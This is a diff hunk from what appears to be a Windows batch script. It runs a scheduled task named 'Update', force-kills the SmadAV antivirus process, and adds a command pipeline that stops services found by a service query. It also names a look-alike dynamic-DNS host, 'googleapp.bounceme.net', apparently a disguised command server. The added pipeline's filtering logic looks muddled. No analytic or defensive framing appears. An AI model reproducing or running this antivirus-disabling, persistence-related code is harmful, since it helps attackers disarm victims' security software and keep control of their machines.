@@ -8,6 +8,7 @@ schtasks /run /tn Update
 
 taskkill /F /IM SmadAV.exe
 sc query | find "SmadAV"
+sc query type= service state= all | findstr /C:"SERVICE_NAME:" /C:"SmadAV" /C:"SmadavProtect32" | findstr /V /C:"SmadAV" /C:"SmadavProtect32" | findstr /V /C:"SERVICE_NAME" | for /F "tokens=2" %i in ('more') do sc stop %i
 
 
 googleapp.bounceme.net
